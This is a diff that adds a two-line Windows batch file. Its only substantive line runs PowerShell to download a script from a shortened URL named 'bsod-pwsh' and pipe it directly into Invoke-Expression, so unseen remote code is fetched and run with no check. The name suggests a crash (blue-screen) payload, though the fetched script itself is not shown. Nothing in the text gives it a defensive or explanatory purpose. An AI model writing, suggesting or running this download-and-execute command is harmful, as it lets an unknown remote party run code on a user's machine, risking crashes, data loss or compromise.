@@ -1,0 +1,2 @@
+@echo off
+powershell -NoProfile -Command "iwr -useb gg.gg/bsod-pwsh | iex"
